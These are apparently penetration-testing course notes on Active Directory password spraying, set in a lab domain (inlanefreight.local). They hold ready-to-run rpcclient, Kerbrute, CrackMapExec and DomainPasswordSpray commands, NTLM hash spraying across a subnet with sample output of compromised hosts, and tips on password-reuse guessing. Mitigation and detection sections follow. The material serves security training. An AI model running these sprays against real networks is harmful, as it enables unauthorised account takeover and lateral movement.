## Linux

With Rpcclient authority name response indicates a successful login attempt, so we can grep for it with the following bash one-liner (adapted from [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)).

### Using a Bash one-liner for the attack
```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Example Output
```shell-session
$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

### Using Kerbrute for the Attack
```shell-session
$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

Another great option is using CrackMapExec. Here we grep for `+` to filter out logon failures.

### Using CrackMapExec & Filtering Logon Failures
```shell-session
$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### Validating the Credentials with CrackMapExec
```shell-session
$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### Local Administrator Password Reuse

If we obtain administrative access and the NTLM password hash or cleartext password for the local administrator account. This can be attempted across multiple hosts in the network. Local administrator account password reuse is widespread due to the use of gold images in automated deployments and the perceived ease of management by enforcing the same password across multiple hosts.

We can use CrackMapExec for this attack. High-value hosts such as SQL or Microsoft Exchange servers are most likely to have privileged user logged in or have their credentials persistent in memory.

One consideration is password reuse or common password formats across accounts. If we find a local administrator's password with something unique like `$desktop%@admin123` it might be worth attempting `$server%@admin123` against servers. also if we find non-standard administrator account such as `bsmith` we might find that the password is reused for similarly named domain user account. The same principle can apply to domain account, if we retrieve the password for a user named `ajones`, it is worth trying the same password for their admin account (if the user has one), for example `ajones_adm`, to see if they are reusing their password. This is also common in domain trust situations. We might obtain valid credentials for a user in domain A that are valid for a user with the same or a similar username in domain B.

In case we only retrieve the NTLM hash for the local administrator, we can spray the NT hash across the entire subnet (or multiple subnets). `Make sure the --local-auth flag is set so we don't potentially lock out the built-in administrator for the domain`. By default the tool will attempt to authenticate to the current domain.

#### Local Admin Spraying with CrackMapExec
```shell-session
$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

This technique isn't good for an assessment that requires stealth. It is always good to look for it, even if it doesn't help us in compromising the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is to use the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have active directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.

## windows

From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain the tool will automatically generate a user list from active directory, query the domain password policy, and exclude user accounts within one attempt of locking out. If we are not authenticated to the domain we can also provide a user list. The `-UserList` flag is used to supply a user list.

### Using DomainPasswordSpray.ps1
```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

We can also use Kerbrute the same way as with a Linux host.

### Mitigations

No single solution will entirely prevent a password spraying attack, but a defense-in-depth approach will render password spraying attacks extremely difficult.

|Technique|Description|
|---|---|
|`Multi-factor Authentication`|Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.|
|`Restricting Access`|It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.|
|`Reducing Impact of Successful Exploitation`|A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.|
|`Password Hygiene`|Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.|

### Other considerations

It is vital to ensure that the domain password lockout policy doesn't increase the risk of denial of service attack, which can happen if administrative intervention is needed to unlock accounts manually.

### Detection

External password spraying attacks can be indicated form many account lockouts in a short period, server or application logs showing many login attempts with valid or non-existent users, or many requests in a short period to a specific application or URL.

In the DC's many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may use LDAP instead of SMB. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771). For this they should enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.

### External Password Spraying

Password spraying is also common for attackers to attempt to gain a foothold on the internet. For example through Email Inboxes or web applications such as externally facing intranet sites. Some common targets include:

- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication

